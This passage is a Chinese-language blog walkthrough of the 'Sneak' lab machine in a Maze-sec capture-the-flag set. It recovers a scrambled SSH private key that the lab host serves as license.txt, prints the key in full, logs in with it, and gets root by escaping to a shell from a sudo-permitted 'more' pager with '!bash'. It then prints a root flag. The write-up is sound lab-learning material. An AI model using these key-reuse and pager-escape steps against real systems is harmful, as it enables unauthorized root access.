class="hljs bash">┌──(root㉿kali)-[/miao/Maze-sec/sneak]<br>└─# curl http://192.168.2.57/cms/license.txt<br>-----YEK ETAVIRP HSSNEPO NIGEB-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>sAdd/5SMN1KWatGo/1evq+7bfETGlpGM2U5Oi7e8nMF2/mDX2PJzAEYAAAQAAEwAAAAAhN<br>8vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy+ekd2A8oHiJJUBD8CPst/BR4PMM+OIYq<br>CugO2A2hUNf4TK8+J/RSLgmuZ9PW5KHzTezkcuONjFFWCvgtGzY1YrCzvIjdVZn9JAngQ9<br>g/MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC/5JtCuXeAvM69jREOaxLA13<br>zC2umAuwE4CUKEenEK2+4B4JRkq1wcVOYR8DeAbnAb/lvn/edv2QS74OgBZizuTo9ZS+20<br>+kQNrEKqcPUv/CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj<br>vPy1xifMKxxT35lAOQGMysOhSaohFWCoSdqx7H8mQIlRAMK5+g8vRR0MLfG6/8dziq5QYl<br>CMF4kKogzmcOR6RVA+jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q+KAAAAB3NzaC1yc2<br>H2IevEyV7LPLQX3fuETTtilWrB6ft3rq/+2HxkRZqBjNVuj4uH/JTh9v5wl9TyMABGAAAE<br>sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ/Aj7LfwUeDzDPjiGKvUIJwCfZ2VX<br>QkziKvXEzPogLojNgdIVzH+kCvfyfk0CopbW/jVuyx8k3MJnrTzYRhlwLYrxMWN2qw8LyY<br>xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv+SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4<br>1DnqCxaDEp/sgtrJgLMBuAlCh3JhitPeAeSEpaNMXlDWE/gHw2Jw2f575vX3rNk0OuDYQm<br>L/whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+<br>n5MIqCJeBjw7jcds4HjSc80deJgDkBjMrTokGaYhlAqUna8+BvJESZEAjSuPI/bUENzynh<br>DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl/9NzSIg<br>wAgRSzrZkhHVUXz3+T373wkBttVkjAd1t8iNU0udXCg3cZcclCFHDIP345xlkqtDxFQMsf<br>RATRmnKH4if3O/0p/vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY<br>eWD9b8W0hSdu+qkbmlcI9FZmL+yXWpoiag+RPlnaIyk+OjzHfcUwnp81JNCIA8fObRHgW7<br>aJ3Q/ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd/cPUkVFSPl/mlY<br>O4yLkC4jUKtXW8Vu2GDlVz495SE5yIDqsP2d6s5RHXNfMVxYySHF3CyIxLuq5vclyku4sr<br>OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm/wBZDiO8npE+0dG/Czelb<br>AAAAxklCGnnTo1Jbjs0N9uhlvzyL5fXTibhUvVhIeIvVxF3xkODLXJxV/BqhnpwPDM+rMN<br>wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH/O+YAmTRDKeDU5fxrQY<br>MRqZx7/je0GTAwbbpEVcf20lYLDc0ygsCnRF92ZnB4N6/KWCsDoVxX2+e6nF54K8w//5O1<br>R9wxe4c/2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu<br>yCg1p+s+ASIw01U5AEMAAAwWaHDSG/RHnoJw4qBeiUTA0H6Uudn0FcVuC9UApP5Z8dCdP0<br>8kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm/FE27Q204TLN<br>tkwzr/RuH9nGj4X3UF+gxjDed5QkMf7f10+8BkVVh8PULRxKuyCbZ7Rlp+TnGiJud35I1u<br>jSQ7sjSRRjY7zJaF+PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23/BRhRWUr4iKq<br>D60XD8ng8Emm8qz1oh2GcYjM22s3MIZZkDQwAAAAT2ZbedvPMgwrxScQulmYH9cZCOP9Fh<br>T5AHbmxc0QWQIKpIyhH4/w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2<br>ujfICkFANZoCfe8p/aYoWunCn8aHt9EosO6yIZ0+UNd9rrI3arzLr7OertbKaPMMLUJJqS<br>sX74l65qBqWMs8knQ2mxI6hmmZ+Tqvl+b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx<br>==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>该私钥格式存在问题，经过对比，发现是单行数需要进行反转</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# awk <span class="hljs-string">&#x27;NR%2==1&#123;for(i=length;i&gt;0;i--)printf &quot;%s&quot;, substr($0,i,1); print &quot;&quot;&#125;</span><br><span class="hljs-string">NR%2==0&#123;print&#125;&#x27;</span> license.txt &gt; sysadm.key<br></code></pre></td></tr></table></figure>
+
+<p>得到正确的私钥</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>miao<span class="hljs-operator">/</span>maze-sec<span class="hljs-operator">/</span>sneak]<br>└─<span class="hljs-comment"># cat sysadm.key         </span><br><span class="hljs-operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAzJP2XDm<span class="hljs-symbol">/2FMn8e7iO5U2MGplGTEfb7+qve1/oGtaWK1NMS5/ddAs</span><br><span class="hljs-number">8</span>vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy<span class="hljs-operator">+</span>ekd2A8oHiJJUBD8CPst<span class="hljs-symbol">/BR4PMM+OIYq</span><br><span class="hljs-number">9</span>QgnAJ9nZVdjIvzCrY1YzGtgvCWFFjNOuckzeTzHK5WP9ZumgLSR<span class="hljs-symbol">/J+8KT4fNUh2A2OguC</span><br>g<span class="hljs-symbol">/MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC/5JtCuXeAvM69jREOaxLA13</span><br><span class="hljs-number">02</span><span class="hljs-operator">+</span>SZ9oTuziZBgO47SQ2vde<span class="hljs-symbol">/nvl/bAnbAeD8RYOVcw1qkRJ4B4+2KEneEKUC4EwuAmu2Cz</span><br><span class="hljs-operator">+</span>kQNrEKqcPUv<span class="hljs-symbol">/CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj</span><br>lYQ5qizd8<span class="hljs-symbol">/6GfLM0RRv8g+5KMARlIQm8H7xqdSoCWFhoaShOsyMGQOAl53TxxKMfix1yPv</span><br>CMF4kKogzmcOR6RVA<span class="hljs-operator">+</span>jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q<span class="hljs-operator">+</span>KAAAAB3NzaC1yc2<br>EAAAGBAMyT9lw5v9hTJ<span class="hljs-symbol">/Hu4juVNjBqZRkxH2+/qr3tf6BrWlitTTEuf3XQLPL7VyEveI2H</span><br>sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ<span class="hljs-symbol">/Aj7LfwUeDzDPjiGKvUIJwCfZ2VX</span><br>YyL8wq2NWMxrYLwlhRYzTrnJM3k8xyuVj<span class="hljs-symbol">/WbpoC0kfyfvCk+HzVIdgNjoLgoPzEXvKizkQ</span><br>xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv<span class="hljs-operator">+</span>SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4<br>mQYDuO0kNr3Xv575f2wJ2wHg<span class="hljs-symbol">/EWDlXMNapESeAePtihJ3hClAuBMLgJrtgs/pEDaxCqnD1</span><br>L<span class="hljs-symbol">/whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+</span><br>hnyzNEUb<span class="hljs-symbol">/IPuSjAEZSEJvB+8anUqAlhYaGkoTrMjBkDgJed08cSjH4sdcj7wjBeJCqIM5n</span><br>DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl<span class="hljs-symbol">/9NzSIg</span><br>fsMQFxDtqklx543PIDHFClccZc3gCXdu0UNi8t1dAjkVttBkw373T<span class="hljs-operator">+</span><span class="hljs-number">3</span>zXUVHhkZrzSRgAw<br>RATRmnKH4if3O<span class="hljs-symbol">/0p/vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY</span><br><span class="hljs-number">7</span>WgHRbOf8AICNJ18pnwUcfHzjO<span class="hljs-operator">+</span>kyIanlPR<span class="hljs-operator">+</span>gaiopWXy<span class="hljs-operator">+</span>LmZF9Iclmbkq<span class="hljs-operator">+</span>udSh0W8b9DWe<br>aJ3Q<span class="hljs-symbol">/ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd/cPUkVFSPl/mlY</span><br>rs4ukylcv5quLxIyC3FHSyYxVMfNXHR5s6d2PsqDIy5ES594zVlDG2uV8WXtKUj4CkLy4O<br>OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm<span class="hljs-symbol">/wBZDiO8npE+0dG/Czelb</span><br>NMr<span class="hljs-operator">+</span>MDPwpnhqB<span class="hljs-symbol">/VxJXLDOkx3FxVvIeIhVvUhbiTXf5Lyzvlhu9N0sjbJ1oTnnGClkxAAAA</span><br>wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH<span class="hljs-symbol">/O+YAmTRDKeDU5fxrQY</span><br><span class="hljs-number">1</span>O5<span class="hljs-symbol">//w8K45Fn6e+2XxVoDsCWK/6N4BnZ29FRnCsgy0cDLYl02fcVEpbbwATG0ej/7xZqRM</span><br>R9wxe4c<span class="hljs-symbol">/2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu</span><br><span class="hljs-number">0</span>PdCd8Z5PpAU9CuVcF0nduU6H0ATUieBq4wJonHR<span class="hljs-symbol">/GSDHaWwAAAMEA5U10wISA+s+p1gCy</span><br><span class="hljs-number">8</span>kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm<span class="hljs-symbol">/FE27Q204TLN</span><br>u1I53duJiGnT<span class="hljs-operator">+</span>plR7ZbCyuKxRLUP8hVVkB8<span class="hljs-operator">+</span><span class="hljs-number">01</span>f7fMkQ5deDjxg<span class="hljs-operator">+</span>FU3X4jGn9HuR<span class="hljs-symbol">/rzwkt</span><br>jSQ7sjSRRjY7zJaF<span class="hljs-operator">+</span>PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23<span class="hljs-symbol">/BRhRWUr4iKq</span><br>hF9POCZc9HYmluQcSxrwgMPvdebZ2TAAAAwQDkZZIM3s22MjYcG2ho1zq8mmE8gn8DX06D<br>T5AHbmxc0QWQIKpIyhH4<span class="hljs-symbol">/w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2</span><br>SqJJULMMPaKbtreO7rLzra3Irr9dNU<span class="hljs-operator">+</span><span class="hljs-number">0</span>ZIy6OsoE9tHa8nCnuWoYa<span class="hljs-symbol">/p8efCoZNAFkCIfju</span><br>sX74l65qBqWMs8knQ2mxI6hmmZ<span class="hljs-operator">+</span>Tqvl<span class="hljs-operator">+</span>b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx<br><span class="hljs-number">8</span>Ut5DpiqUW2nkAAAAMc3lzYWRtQFNuZWFrAQIDBAUGBw<span class="hljs-operator">==</span><br><span class="hljs-operator">-</span>----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>得到权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# ssh sysadm@192.168.2.57 -i sysadm.key <br>Warning: Permanently added <span class="hljs-string">&#x27;192.168.2.57&#x27;</span> (ED25519) to the list of known hosts.<br>Linux Sneak 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>sysadm@Sneak:~$ <span class="hljs-built_in">id</span><br>uid=1002(sysadm) gid=1003(sysadm) <span class="hljs-built_in">groups</span>=1003(sysadm)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、more提权"><a href="#2、more提权" class="headerlink" title="2、more提权"></a>2、more提权</h2><p>使用<code>sudo -l</code>，发现可以<code>more</code>查看这个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> sysadm on Sneak:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sysadm may run the following commands on Sneak:<br>    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh<br></code></pre></td></tr></table></figure>
+
+<p>但是文件长度不够导致无法分页进入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ /usr/bin/more /var/log/custom/fake-cleanup.sh<br><span class="hljs-comment"># System cleanup script - DO NOT MODIFY</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="方法一：管道阻塞"><a href="#方法一：管道阻塞" class="headerlink" title="方法一：管道阻塞"></a>方法一：管道阻塞</h3><p>可以通过管道阻塞的方式进行提权，输入<code>!bash</code>即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">echo</span> miao | <span class="hljs-built_in">sudo</span> /usr/bin/more /var/log/custom/fake-cleanup.sh<br>miao<br>!bash<br>root@Sneak:/home/sysadm# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法二：修改stty"><a href="#方法二：修改stty" class="headerlink" title="方法二：修改stty"></a>方法二：修改stty</h3><ul>
+<li>修改终端的<code>stty rows 2</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">stty</span> rows 2<br>sysadm@Sneak:~$ <span class="hljs-built_in">sudo</span> /usr/bin/more /var/log/custom/fake-cleanup.sh<br><span class="hljs-comment"># System cleanup script - DO NOT MODIFY</span><br>!bash<br>root@Sneak:/home/sysadm# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Sneak:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-36bee2f8db4943b0f6c9d16afe11d454&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、ssh私钥"><a href="#1、ssh私钥" class="headerlink" title="1、ssh私钥"></a>1、ssh私钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnN<br>...（中间省略）...<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="2、more提权-1"><a href="#2、more提权-1" class="headerlink" title="2、more提权"></a>2、more提权</h2><p><code>more</code>的特性：</p>
+<ul>
+<li>在分页暂停时，<code>more</code>可以执行多种命令，其中以<code>!</code>开头的命令会在shell中执行。</li>
+<li>例如，输入<code>!/bin/bash</code>会启动一个交互式shell。</li>
+</ul>
+<p>当输出文件的行数不满足分页时，可以通过下述方式实现分页暂停</p>
+<ul>
+<li>管道阻塞，<code>echo xxxx | sudo more</code></li>
+<li>修改<code>stty</code></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+        <a href="/tags/ssh%E7%A7%81%E9%92%A5%E6%A0%BC%E5%BC%8F/" class="print-no-link">#ssh私钥格式</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-more/" class="print-no-link">#提权-more</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Sneak</div>
+      <div>http://miao-sec.github.io/Maze-sec/Sneak/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Tree/" title="Tree">
+                        <span class="hidden-mobile">Tree</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
